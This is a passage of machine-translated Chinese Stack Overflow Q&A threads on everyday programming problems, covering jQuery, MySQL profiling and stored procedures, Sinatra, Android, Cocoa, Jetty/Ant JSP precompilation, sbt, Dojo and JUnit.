$("#container").on("click", "div", function(e) {
  $("#container div").css("z-index", 0); 
  $(this).css({ "z-index": 10, "opacity": 0.4 })
         .fadeTo(400, 1);
}); 
```

可选择添加`.not($(this))`to`$("#container div")`以避免将当前选定框的 z-index 更改为 0。但是因为我们把它改回10后就行了，其实也没有必要。如果将来代码变得更复杂，可能有助于避免错误。

在这里试试：http:
[//jsfiddle.net/BWABk/](http://jsfiddle.net/BWABk/)

# mysql - 如何检查 MySQL 查询需要多长时间？

> ID：11735621
> 
> 赞同：8
> 
> 时间：2012-07-31T08:00:26.800
> 
> 标签：mysql, database, indexing

当我运行查询时，我不希望它打印到控制台。我只是想看看时间。

```
9166 rows in set (0.90 sec) 
```

这就是我想看到的，而不是打印所有内容。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-31T08:22:22.163

试试这个简单的例子

```
mysql> set profiling=1;
mysql> select count(*) from comment;
mysql> select count(*) from message;
mysql> show profiles;

+----------+------------+------------------------------+
| Query_ID | Duration   | Query                        |
+----------+------------+------------------------------+
|        1 | 0.00012700 | select count(*) from comment |
|        2 | 0.00014200 | select count(*) from message |
+----------+------------+------------------------------+
2 rows in set (0.00 sec) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T08:05:43.940

您可以在子查询中编写查询，`COUNT`以执行以下操作：

```
SELECT COUNT(1)
FROM ( SELECT * FROM your_table WHERE ...) a 
```

它可能会稍微减慢您的查询速度，因为它`COUNT`也在这样做，但我认为它可以忽略不计。

为了测量查询的性能，您可以`PROFILES`在 MySQL 中打开如下：

```
SET profiling = 1; 
```

有关更多详细信息，`PROFILES`请参见[此处](http://dev.mysql.com/doc/refman/5.0/en/show-profiles.html)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:24:53.773

```
$starttime = microtime(true);

//Do your query and stuff here

$endtime = microtime(true);
$duration = $endtime - $starttime; //calculates total time taken 
```

# ruby - 从模型访问 Sinatra 设置

> ID：11735622
> 
> 赞同：5
> 
> 时间：2012-07-31T08:00:31.463
> 
> 标签：ruby, sinatra

我有一个模块化的 Sinatra 应用程序。我在我的配置块中设置了一些自定义变量，并希望在我的模型中访问这些设置。

问题是，`NoMethodError`当我尝试从`MyModel`. 不过，标准设置似乎仍然可以正常工作。我怎样才能使这项工作？

```
# app.rb
require_relative 'models/document'

class App < Sinatra::Base
  configure do
    set :resource_path, '/xfiles/i_want_to_believe'
  end

  get '/' do
    @model = MyModel.new
    haml :index
  end
end

# models/my_model.rb
class MyModel
  def initialize
    do_it
  end
  def do_it
    ...
    settings.resource_path # no method error
    ...
    settings.root # works fine
  end
end 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2014-09-03T08:42:04.997

我认为您应该可以通过

```
Sinatra::Application.settings.documents_path 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-25T12:17:17.563

我最终做了：

```
#document.rb
class Document
  def self.documents_path=(path)
    @documents_path = path
  end
  def self.documents_path
    @documents_path
  end
  ...
end

#app.rb
configure do
  set :documents_path, settings.root + "/../documents/" 
  Document.documents_path = settings.documents_path
end 
```

然后在我的 find 方法中使用 Document.documents_path 。

# android - Android - 动态表行 NullPointerException

> ID：11735623
> 
> 赞同：0
> 
> 时间：2012-07-31T08:00:43.173
> 
> 标签：android, user-interface, nullpointerexception, tablelayout, tablerow

我正在制作一个 android 应用程序，它根据从您的偏好中读取的字符串创建一个动态界面：

```
ScrollView sv = new ScrollView(this);
    LinearLayout ll = new LinearLayout(this);
    ll.setOrientation(LinearLayout.VERTICAL);

    TableLayout tl = new TableLayout(this);
    TableRow[] tr = null;

    SharedPreferences SP = PreferenceManager.getDefaultSharedPreferences(getBaseContext());
    String Favs = SP.getString("Favs", "None");
    String[] Genveje;
    if (!Favs.equals("None"))
    {
        Genveje = Favs.split(";");
        tr = new TableRow[Genveje.length];
        for (int i = 0; i < Genveje.length; i++)
        {
            String BtnName = Genveje[i].split("@")[0];
            String BtnPath = Genveje[i].split("@")[1];
            Button btn = new Button(this);

            btn.setText(BtnName);
            btn.setTag(BtnPath);
            btn.setOnClickListener(this);
            btn.setOnLongClickListener(this);

            tr[i].addView(btn);

                    .........
        } 
```

问题是：当我尝试用 tr[i] 做任何事情时，我得到一个 NullPointerException，我不知道为什么。

有人有建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:05:31.897

```
tr[i]=new TableRow(this);
tr[i].addView(btn); 
```

# cocoa - cocoa：如何通过 IB 创建自定义视图？

> ID：11735626
> 
> 赞同：1
> 
> 时间：2012-07-31T08:01:06.220
> 
> 标签：cocoa

我想创建一个自定义视图，比如 MyView，它只包含一个按钮并在我单击它时打印出“hello my view”。下次我想使用它时，我只需要从 IB 向窗口添加一个自定义视图，将 MyView.m 添加到项目中并将自定义视图的类设置为 MyView。

我的问题是：

1.  我想用IB来设置MyView的外观，但是不知道如何获取对应的视图文件：MyView.m以便下次使用MyView.m文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:12:33.423

您需要使用代码创建子类视图；例如：

我的视图.h：

```
#import <Cocoa/Cocoa.h>

@implementation MyView : NSView
{
    IBOutlet NSTextField *_label;
}

- (IBAction)buttonPressed:(id)sender;

@end 
```

我的视图.m：

```
#import "MyView.h"

- (id)initWithFrame:(NSRect)frame
{
    self = [super initWithFrame:frame];
    if (self != nil)
    {
        // Init here
    }
    return self;
}

- (void)awakeFromNib:
{
    // Init here
}

- (IBAction)buttonPressed:(id)sender
{
    [_label setStringValue:@"hello my view"];
}

@end 
```

您需要使用 IB 创建自定义视图布局，并将拥有的类从更改`NSView`为`MyView`（如果我记得，使用第三个选项卡）。

然后`_label`从左窗格上的拥有对象连接（Ctrl-拖动）并将按钮操作连接到`buttonPressed:`方法（Ctrl-拖动）。

# java - 使用 ant 将 jsps 预编译为 Jetty8 的类

> ID：11735628
> 
> 赞同：2
> 
> 时间：2012-07-31T08:01:12.693
> 
> 标签：java, jsp, jetty

我们正在使用jspc ant任务将JSP文件预编译成类/（然后打包成war）

现在我们切换到 Jetty 8。根据文档，有一个 Maven 插件可以做到[这一点](http://wiki.eclipse.org/Jetty/Howto/Configure_JSP)。我们有蚂蚁任务来做同样的事情吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T00:37:22.610

最好使用 jetty 发行版附带的 JSP 库。

这是一个示例，使用 jetty-distribution-8.1.5.v20120716

```
<?xml version="1.0" ?>
<project name="AntExample1" default="war">

    <property name="jetty.home" value="${user.home}/code/intalio/distros/jetty-distribution-8.1.5.v20120716" />

    <path id="compile.jspc">
        <fileset dir="${jetty.home}">
            <include name="lib/servlet-api-*.jar" />
            <include name="lib/jsp/*.jar" />
        </fileset>
    </path>

    <path id="compile.classpath">
        <fileset dir="WebContent/WEB-INF/lib">
            <include name="*.jar" />
        </fileset>
        <path refid="compile.jspc" />
    </path>

    <target name="jspc" depends="compile">
        <taskdef classname="org.apache.jasper.JspC" name="jasper2" classpathref="compile.jspc" />
        <jasper2 validateXml="false"
            uriroot="WebContent"
            addWebXmlMappings="true"
            webXmlFragment="WebContent/WEB-INF/generated_web.xml"
            compilerSourceVM="1.6"
            compilerTargetVM="1.6"
            outputDir="build/gen-src"
            verbose="9" />
    </target>

    <target name="init">
        <mkdir dir="build/classes" />
        <mkdir dir="build/gen-src" />
        <mkdir dir="dist" />
        <copy todir="build/gen-src">
            <fileset dir="src" includes="**/*.java" />
        </copy>
    </target>

    <target name="compile" depends="init">
        <javac destdir="build/classes" debug="true" srcdir="build/gen-src">
            <classpath refid="compile.classpath" />
        </javac>
    </target>

    <target name="war" depends="jspc">
        <war destfile="dist/AntExample.war" webxml="WebContent/WEB-INF/web.xml">
            <fileset dir="WebContent" />
        <classes dir="build/classes" />
        </war>
    </target>

    <target name="clean">
        <delete dir="dist" />
        <delete dir="build" />
    </target>

</project> 
```

**更新：2013 年 4 月 8 日**

将此构建的示例项目推送到 github。

[https://github.com/jetty-project/jetty-example-jspc-ant](https://github.com/jetty-project/jetty-example-jspc-ant)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T15:06:31.897

[Jasper 有 jspc；链接页面有调用它的蚂蚁代码。](http://tomcat.apache.org/tomcat-6.0-doc/api/org/apache/jasper/JspC.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T22:11:40.750

从您的第一句话开始，您显然已经在使用 ant 任务来预编译 jsp 文件......所以使用 jetty-8 并不意味着您必须更改该过程，您仍然可以像您一样进行预编译一直，像以前一样构建你的战争文件，然后部署到jetty-8中。您需要将 jsp 添加到 start.ini 中的 OPTIONS 以使 jsp 引擎进入服务器类加载器。

# android - 如何在不使用 android 中的 try/catch 处理的情况下获得 401 响应

> ID：11735636
> 
> 赞同：15
> 
> 时间：2012-07-31T08:01:45.130
> 
> 标签：android, httpurlconnection

我正在使用`HttpUrlConnection`从我的 android 应用程序发出网络请求。除了一件事 401 外，一切正常。每当服务器返回状态码为 401 的响应时，我的应用程序都会抛出`IOException`一条消息，说明`"no authentication challenge found"`. 谷歌搜索后，我没有找到单一的解决方案，但只有解决方法（使用 try/catch 处理它，假设它是 401 响应）。

这是代码片段：

```
public Bundle request(String action, Bundle params, String cookie) throws FileNotFoundException, MalformedURLException, SocketTimeoutException,
        IOException {

    OutputStream os;

    String url = baseUrl + action;
    Log.d(TAG, url);
    HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
    conn.setConnectTimeout(30 * 1000);
    conn.setReadTimeout(30 * 1000);
    conn.setRequestProperty("User-Agent", System.getProperties().getProperty("http.agent") + "AndroidNative");
    conn.setRequestMethod("POST");
    conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
    conn.setRequestProperty("Connection", "Keep-Alive");
    conn.setDoOutput(true);
    conn.setDoInput(true);
    if (cookie != null) {
        conn.setRequestProperty("Cookie", cookie);
    }

    if (params != null) {
        os = conn.getOutputStream();
        os.write(("--" + boundary + endLine).getBytes());
        os.write((encodePostBody(params, boundary)).getBytes());
        os.write((endLine + "--" + boundary + endLine).getBytes());
        uploadFile(params, os);
        os.flush();
        os.close();
    }

    conn.connect();

    Bundle response = new Bundle();
    try {
        response.putInt("response_code", conn.getResponseCode());
        Log.d(TAG, conn.getResponseCode() + "");
        response.putString("json_response", read(conn.getInputStream()));
        List<String> responseCookie = conn.getHeaderFields().get("set-cookie");
        // Log.d(TAG, responseCookie.get(responseCookie.size() - 1));
        response.putString("cookie", responseCookie.get(responseCookie.size() - 1));
    } catch (SocketTimeoutException e) {
        throw new SocketTimeoutException(e.getLocalizedMessage());
    } catch (FileNotFoundException e) {
        throw new FileNotFoundException(e.getLocalizedMessage());
    } catch (IOException e) {
        e.printStackTrace();
        response.putInt("response_code", HttpURLConnection.HTTP_UNAUTHORIZED);
        response.putString("json_response", read(conn.getErrorStream()));
    }

    // debug
    Map<String, List<String>> map = conn.getHeaderFields();
    for (String key : map.keySet()) {
        List<String> values = map.get(key);
        for (String value : values) {
            Log.d(key, value);
        }
    }

    conn.disconnect();

    return response;
} 
```

我真的很想知道，为什么会抛出这个异常？身份验证质询是什么意思？如何提供身份验证质询？为了克服这种情况，我必须对代码进行哪些更改？

请赐教.. :)

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-08-27T10:15:45.847

IOException 是一个非常普遍的异常，您不能安全地假设每次抛出它时都会出现 401 状态代码。

如果您第一次请求状态码时恰好包含 401，则 HttpURLConnection 将抛出 IOException。此时，连接的内部状态将发生变化，它现在可以为您提供状态码，而不会出现任何错误。

```
int status = 0;
try {
    status = conn.getResponseCode();
} catch (IOException e) {
    // HttpUrlConnection will throw an IOException if any 4XX
    // response is sent. If we request the status again, this
    // time the internal status will be properly set, and we'll be
    // able to retrieve it.
    status = conn.getResponseCode();
}
if (status == 401) {
    // ...
} 
```

更多详情，[http://www.tbray.org/ongoing/When/201x/2012/01/17/HttpURLConnection](http://www.tbray.org/ongoing/When/201x/2012/01/17/HttpURLConnection)

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-07-31T09:07:57.977

尝试使用 HttpClient

```
private void setCredentials(String login, String password) {
    if (login != null && password != null)
        httpClient.getCredentialsProvider().setCredentials(
                new AuthScope(URL_HOST, 80), new UsernamePasswordCredentials(login, password));

}

private InputStream execute(String url, String login, String password) {
        setCredentials(login, password);
        HttpGet get = new HttpGet(url);
        try {
            HttpResponse response = httpClient.execute(get);
            int code = response.getStatusLine().getStatusCode();
            if (code == HttpURLConnection.HTTP_OK) {
                InputStream stream = response.getEntity().getContent();
                return stream;
            } else {
                Log.e("TAG", "Wrong response code " + code + " for request " + get.getRequestLine().toString());
                return null;
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    } 
```

# dependencies - 未解决的游戏！依赖项：POM 而不是 JAR

> ID：11735640
> 
> 赞同：0
> 
> 时间：2012-07-31T08:02:04.737
> 
> 标签：dependencies, playframework-2.0, sbt

我正在拍戏！使用 Neo4j 库的应用程序。Neo4j 工作正常，但我正在尝试使用嵌入式数据库设置服务器（包括 Web 管理）（[遵循本教程](http://docs.neo4j.org/chunked/milestone/server-embedded.html)）。

我的依赖是：

```
val appDependencies = Seq(
  "org.neo4j" % "neo4j" % "1.8.M06",
  "org.neo4j.app" % "neo4j-server" % "1.8.M06",
  "org.neo4j.app" % "neo4j-server" % "1.8.M06" classifier "static-web",
  "com.sun.jersey" % "jersey-core" % "1.9"
) 
```

但是，当我运行`update`命令时，`neo4j-server-1.8.M06.jar`缺少 。不知何故，sbt 为这个依赖项获取所有 jars 和 pom 文件：

```
[info] Updating [...]...

[...]

[info] downloading http://repo.typesafe.com/typesafe/releases/org/neo4j/neo4j/1.8.M06/neo4j-1.8.M06.pom ...
[info]  [SUCCESSFUL ] org.neo4j#neo4j;1.8.M06!neo4j.pom (758ms)
[info] downloading http://repo.typesafe.com/typesafe/releases/org/neo4j/app/neo4j-server/1.8.M06/neo4j-server-1.8.M06-static-web.jar ...
[info]  [SUCCESSFUL ] org.neo4j.app#neo4j-server;1.8.M06!neo4j-server.jar (3678ms)
[info] downloading http://repo.typesafe.com/typesafe/releases/com/sun/jersey/jersey-core/1.9/jersey-core-1.9.jar ...
[info]  [SUCCESSFUL ] com.sun.jersey#jersey-core;1.9!jersey-core.jar(bundle) (941ms)
[info] downloading http://repo.typesafe.com/typesafe/releases/org/neo4j/neo4j-kernel/1.8.M06/neo4j-kernel-1.8.M06.jar ...

[...] 
```

如何告诉 sbt 获取所需的 jar 文件？添加`withSources()`并没有解决这个问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T10:24:58.670

我终于让它与以下依赖项一起工作：

```
val appDependencies = Seq(
  "org.neo4j" % "neo4j" % "1.8.M06",
  "org.neo4j.app" % "neo4j-server" % "1.8.M06" classifier "static-web" classifier "",
  "com.sun.jersey" % "jersey-core" % "1.9"
) 
```

关键是空`classifier ""`...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:44:00.807

通过指定人工制品的确切位置来试试这个：

```
val appDependencies = Seq(
  "org.neo4j" % "neo4j" % "1.8.M06",
  "org.neo4j.app" % "neo4j-server" % "1.8.M06" from "http://m2.neo4j.org/content/repositories/releases/org/neo4j/app/neo4j-server/1.8.M06/neo4j-server-1.8.M06.jar",
  "org.neo4j.app" % "neo4j-server" % "1.8.M06" classifier "static-web" from "http://m2.neo4j.org/content/repositories/releases/org/neo4j/app/neo4j-server/1.8.M06/neo4j-server-1.8.M06-static-web.jar",
  "com.sun.jersey" % "jersey-core" % "1.9"
) 
```

# dojo - Dojo/Dijit/SpringJS 忽略的选定属性

> ID：11735641
> 
> 赞同：0
> 
> 时间：2012-07-31T08:02:04.813
> 
> 标签：dojo, spring-js

我有以下选择的源代码：

```
<select id="_conteneurNum_id" name="conteneurNum" data-dojo-type="dijit.form.FilteringSelect">
<option selected="selected" value="">Tous</option>
<option value="1">951</option>
<option value="2">753</option>
<option value="3">753159</option>
</select> 
```

渲染如下：

![表单域的渲染](../Images/c375a211ae134f3cff3550be8caf7e1d.png)

似乎 Dojo/Dijit/SpringJS 忽略了**selected**属性（请注意，首先向用户显示的是白色标签而不是*"Tous"*。

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T11:30:57.400

控制台中是否有任何错误？

我有一个小提琴，可以完全按照您的代码进行操作：

[http://jsfiddle.net/cswing/eJP3U/](http://jsfiddle.net/cswing/eJP3U/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-17T12:38:14.917

在与 MyEclipse 2014、Spring 3.1 和旧的 Dojo/Dijit 版本搏斗几个小时后，我刚刚找到了一种解决方法，我知道这很旧，但 MyEclipse 包含了所有这些旧版本。

我尝试了 FilteringSelect、使用空值选择、使用值的 html 选项，并替换了弄乱项目其余部分的 dojo 库。所以如果它可以帮助任何人，我会在这里发布：

如果您想在选择中使用虚拟提示选项，例如“-- 选择项目--”，则这种情况很常见，并且值为空。Dojo/dijit 版本与 MyEclipse 一起打包到 spring-js-2.3.1.RELEASE 中，用下拉列表中显示的分隔符将选项替换为空值。在 Dojo/Dijit 的最后几个版本中，这种行为似乎得到了纠正，正如您在 Craig Swing 的小提琴中看到的那样。

如果您绑定的属性不是字符串，您可以将单个 espace 指定为 dummy 选项的值而不是 null，因为稍后将在控制器中绑定为 null，因此将显示 dummy 选项。前任：

```
<option selected="selected" value="">Tous</option> 
```

但是如果属性是一个字符串，这样你会在你的控制器的属性中发现一个不需要的空格。

所以最后选择直接修改Select.js

将它放在你的项目中 webapps/resources/dijit/form/Select.js 注释这行：

```
/*
if(!_1.value){
return new dijit.MenuSeparator();
}else{
*/
var _2=dojo.hitch(this,"_setValueAttr",_1);
var _3=new dijit.MenuItem({option:_1,label:_1.label,onClick:_2,disabled:_1.disabled||false});
dijit.setWaiRole(_3.focusNode,"listitem");
return _3;
/*
}
*/ 
```

并且不要忘记在 web.xml 中为 Resource Servlet 覆盖此路径：

```
<servlet-mapping>
    <servlet-name>My Servlet</servlet-name>
    <url-pattern>/resources/dijit/form/Select.js</url-pattern>
</servlet-mapping> 
```

# java - 使用自定义消息报告 JUnit 断言失败

> ID：11735643
> 
> 赞同：1
> 
> 时间：2012-07-31T08:02:07.750
> 
> 标签：java, junit, reporting

我一直在 Eclipse 中使用 JUnit 创建单元测试，并且 JUnit 的基本原理对我来说很清楚。测试按应有的方式运行，现在是时候找到一种报告失败测试的好方法了。我在网上遇到的大多数示例都是使用某种构建系统（如 Ant、Maven 或 Hudson）在构建项目的同时运行测试，但在构建过程中不需要这种集成。测试应该能够独立于构建系统运行。最后，这些系统只是获取从 JUnit 获得的信息，并将其放入一个漂亮的 HTML 布局中。

[我了解到，可以通过 JUnitCore 的 RunListener 类创建自定义侦听器](http://www.junit.org/apidocs/org/junit/runner/notification/RunListener.html)来读取 JUnit 信息，并使用“testFailure”方法处理发生的故障。创建测试时，我总是为断言错误提供自定义消息。我的问题是这条消息没有出现在 JUnit 的失败跟踪中。相反，失败跟踪将显示“java.lang.Exception：无法调用 *”。当我查看控制台时，我看到了相同的堆栈跟踪，但下面还有一行前面是“Caused by: *”，在这里我确实看到了我的自定义错误消息。

```
Caused by: java.lang.AssertionError: <my custom error message>
    at * 
```

由于我刚刚开始使用 JUnit，我不知道这是否是 JUnit 的正常行为，还是我实现测试的方式有问题，我是否应该在故障跟踪中看到我的自定义消息？我还注意到，当我在执行测试的方法中发现断言错误时，我可以使用“error.getMessage()”访问该消息。因此，如果有必要，这将是一个解决方案，并且还允许我在报告中包含在我发现错误时可访问的附加信息（即网页的 url 等），但在每个断言周围放置一个 try-catch 块在我看来，这会破坏它的目的。

正如我所说，我是单元测试的新手，也是一般的 java 开发新手，所以我很可能会犯一些愚蠢的错误。非常欢迎任何指针！

**更新 2：****在控制台上的堆栈跟踪** 的匿名版本下方。也许这有助于澄清我的问题。

```
 java.lang.reflect.InvocationTargetException
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at xxxxx.xxxxxxxxxxxx.xxxxxxxxx(xxxxxxxxxxx.java:103)
        at xxxxx.xxxxxxxxxxxxxx.xxxxxx(xxxxxxxxxxx.java:62)
        at junit.framework.TestCase.runBare(TestCase.java:134)
        at junit.framework.TestResult$1.protect(TestResult.java:110)
        at junit.framework.TestResult.runProtected(TestResult.java:128)
        at junit.framework.TestResult.run(TestResult.java:113)
        at junit.framework.TestCase.run(TestCase.java:124)
        at xxxxx.xxxxxxxxxxxx.xxxxx(xxxxxxxxxxxx.java:90)
        at junit.framework.TestSuite.runTest(TestSuite.java:243)
        at junit.framework.TestSuite.run(TestSuite.java:238)
        at xxxxx.xxxxxxxxxxxxxxxxxxxx.xxxx(xxxxxxxxxxxxxxxx.java:87)
        at junit.framework.TestSuite.runTest(TestSuite.java:243)
        at junit.framework.TestSuite.run(TestSuite.java:238)
        at xxxxx.xxxxxxxxxxxxxxxxxxxxxx.xxxxx(xxxxxxxxxxxxxx.java:87)
        at junit.framework.TestSuite.runTest(TestSuite.java:243)
        at junit.framework.TestSuite.run(TestSuite.java:238)
        at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:83)
        at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:50)
        at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38)
        at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:467)
        at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:683)
        at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:390)
        at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:197)
    Caused by: java.lang.AssertionError: <xx my custom message xx>.
        at xxx.xxxxxxxx.xxxxxxxxxxxxxx(xxxxxxxx.java:100)
        ... 27 more 
```

下面是 JUnit java.lang.Exception: could not invoke action on current page**报告的堆栈跟踪**的匿名版本

```
java.lang.Exception: could not invoke action <xx action name xxx> on current page class xxxx.xxxxxxx: [Ljava.lang.StackTraceElement;@71d382ab
at xxxxx.xxxxxxxxxxxxxxxxx.xxxxx(xxxxxxxxxxxxxxxxxxxx.java:65)
at junit.framework.TestCase.runBare(TestCase.java:134)
at junit.framework.TestResult$1.protect(TestResult.java:110)
at junit.framework.TestResult.runProtected(TestResult.java:128)
at junit.framework.TestResult.run(TestResult.java:113)
at junit.framework.TestCase.run(TestCase.java:124)
at xxxxx.xxxxxxxxxxxxxxxxx.xxxxx(xxxxxxxxxxxxxxxxxxxx.java:90)
at junit.framework.TestSuite.runTest(TestSuite.java:243)
at junit.framework.TestSuite.run(TestSuite.java:238)
at xxxxx.xxxxxxxxxxxxxxxxx.xxxxx(xxxxxxxxxxxxxxxxxxxx.java:87)
at junit.framework.TestSuite.runTest(TestSuite.java:243)
at junit.framework.TestSuite.run(TestSuite.java:238)
at xxxxx.xxxxxxxxxxxxxxxxx.xxxxx(xxxxxxxxxxxxxxxxxxxx.java:87)
at junit.framework.TestSuite.runTest(TestSuite.java:243)
at junit.framework.TestSuite.run(TestSuite.java:238)
at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:83)
at org.junit.runners.Suite.runChild(Suite.java:128)
at org.junit.runners.Suite.runChild(Suite.java:24)
at org.junit.runners.ParentRunner$3.run(ParentRunner.java:231)
at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:60)
at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:229)
at org.junit.runners.ParentRunner.access$000(ParentRunner.java:50)
at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:222)
at org.junit.runners.ParentRunner.run(ParentRunner.java:300)
at org.junit.runner.JUnitCore.run(JUnitCore.java:157)
at org.junit.runner.JUnitCore.run(JUnitCore.java:136)
at org.junit.runner.JUnitCore.run(JUnitCore.java:117)
at xxxxx.<xx class that initiates the RunListener xx>.main(<xx class that initiates the RunListener xx>.java:11) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:10:23.873

> 测试应该能够独立于构建系统运行。

即使您使用构建系统，测试也将是独立的。从长远来看，它的目的是让你的生活更轻松，所以我建议你考虑使用一个。我建议我一开始不喜欢的 maven，因为它告诉你如何布局目录之类的东西，但现在我可以看到这让你的生活更轻松。

> 当我查看控制台时，我看到了相同的堆栈跟踪，但下面还有一行前面是“Caused by: *”，在这里我确实看到了我的自定义错误消息。

大多数工具都会删除它，因此您只能看到您需要的内容。例如，在大多数 IDE 中，您可以单击堆栈跟踪并导航到导致问题的代码行。如果您使用 maven，IDE 将与您的 maven 配置同步，因此它可以找到负责的代码。

> 我还注意到，当我在执行测试的方法中发现断言错误时，我可以使用“error.getMessage()”访问该消息。

如果您使用 maven 和/或 IDE，则无需执行任何此操作。

> 我很可能犯了一些愚蠢的错误。

它似乎并非如此。我建议您使用大多数开发人员使用的工具（例如 IDE 和 maven），并且这些问题中的大部分都是为您处理的。（还有许多其他问题，您可能永远不知道它对您有用；）

# mysql - 这个存储过程的错误是什么

> ID：11735644
> 
> 赞同：0
> 
> 时间：2012-07-31T08:02:08.840
> 
> 标签：mysql, codeigniter, stored-procedures

您好我正在使用这个存储过程

```
DELIMITER $$
 DROP PROCEDURE IF EXISTS get_all_user_selected_children_of_preference$$

CREATE PROCEDURE get_all_user_selected_children_of_preference(
   IN entity_id INT,
   IN user_type INT,
   IN parent_id INT
)

BEGIN

     DECLARE profilepreferenceid INT;
     DECLARE inpreferenceid INT;
     DECLARE preference_parent_id INT;
     DECLARE prefvalue VARCHAR(50);
     DECLARE no_more_prefrences INT;
     DECLARE element_type INT;
     DECLARE preference_type INT;

     DECLARE cur CURSOR for  select ProfilePreferenceID,PreferenceParentID,PreferenceID,ProfilePreferenceValueAlias,ElementType,PreferenceType from xxxxx  WHERE PreferenceParentID=parent_id AND EntityID=entity_id AND UserType=user_type ;
     DECLARE CONTINUE HANDLER FOR NOT FOUND SET no_more_prefrences=1;

     CREATE TEMPORARY TABLE IF NOT EXISTS temp_user_selected_preference_children(

          ProfilePreferenceID int(11) NOT NULL AUTO_INCREMENT,
          PreferenceIDTmp INT(11),
          PreferenceParentIDTmp INT(11),
          ProfilePreferenceValueTmp varchar(255),
          userProfileIdTmp INT(11),
          elementTypeTmp INT (11),
          PreferenceTypeTmp INT (11),
          PRIMARY KEY (ProfilePreferenceID)     
     );

          SET no_more_prefrences=0;
          OPEN cur;

             dept_loop:WHILE(no_more_prefrences=0) DO

                     FETCH cur INTO profilepreferenceid,preference_parent_id,inpreferenceid,prefvalue,element_type,preference_type;
                     IF no_more_prefrences=1 THEN
                        LEAVE dept_loop;
                     END IF;

                                     INSERT  INTO temp_user_selected_preference_children(ProfilePreferenceID,PreferenceIDTmp,PreferenceParentIDTmp,ProfilePreferenceValueTmp,userProfileIdTmp,elementTypeTmp,PreferenceTypeTmp)
                                        VALUES  (profilepreferenceid,inpreferenceid,preference_parent_id,prefvalue,entity_id,element_type,preference_type);

                                     CALL get_all_user_selected_children_of_preference(entity_id,user_type,inpreferenceid);

             END WHILE dept_loop;

          CLOSE cur;    

END$$
DELIMITER ; 
```

我在 phpmyamin 中运行它，它运行成功。

然后我从codeigniter调用它

```
public function get_user_selected_all_sub_preferencs_of_preference($preference_id,$user_type,$profile_id)
{
    $this->db->query("SET max_sp_recursion_depth=1000");
    $this->db->query("CALL get_all_user_selected_children_of_preference(".$profile_id.",".$user_type.",".$preference_id.")");
    $data= $this->db->query("SELECT * FROM temp_user_selected_preference_children");
    $dara_arr=$data->result_array();

    $this->db->query("DELETE FROM temp_user_selected_preference_children WHERE userProfileIdTmp=".$profile_id."");

    if(is_array($dara_arr)&&count(array_filter($dara_arr))>0){
        return $dara_arr;
    }
    else
    {
        return FALSE;
    }
} 
```

然后它给出了错误

```
A Database Error Occurred
Error Number: 1054

Unknown column 'PreferenceTypeTmp' in 'field list'

CALL get_all_user_selected_children_of_preference(65,2,1)

Filename: C:\xampp\htdocs\elephanti2\system\database\DB_driver.php

Line Number: 330 
```

找不到这是什么。

在 mysql 控制台中，我描述了表

![在此处输入图像描述](../Images/1f9992990f382921c9b0118d0d661009.png)

请帮忙 。提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T08:41:34.533

[`CREATE TABLE`如语法](http://dev.mysql.com/doc/en/create-table.html)手册页所述：

> `TEMPORARY`表仅对当前连接可见，并在连接关闭时自动删除。这意味着两个不同的连接可以使用相同的临时表名，而不会相互冲突或与现有`TEMPORARY`的同名非表冲突。（在删除临时表之前，隐藏现有表。）

因此，`DESCRIBE`您从 MySQL 命令行客户端运行的命令引用了与 CodeIgniter 正在使用的表不同的表。

由于存储过程使用`CREATE TEMPORARY TABLE IF NOT EXISTS`，它只会在该连接上不存在同名的一个表时创建一个新表：也许 CodeIgniter 之前创建了一个同名但具有不同列的表？

您可能打算先删除任何现有表，然后执行简单的创建：

```
DROP TEMPORARY TABLE IF EXISTS temp_user_selected_preference_children;
CREATE TEMPORARY TABLE temp_user_selected_preference_children (
-- etc. 
```

# opencv - OpenCV::matchShapes() 示例？

> ID：11735646
> 
> 赞同：2
> 
> 时间：2012-07-31T08:02:12.443
> 
> 标签：opencv, object-detection

我想使用`matchShapes()`函数在查询图像中查找对象。

假设我有一本书的模型图像，我想提取它的形状，然后尝试在另一个图像中找到这本书（它的形状）。

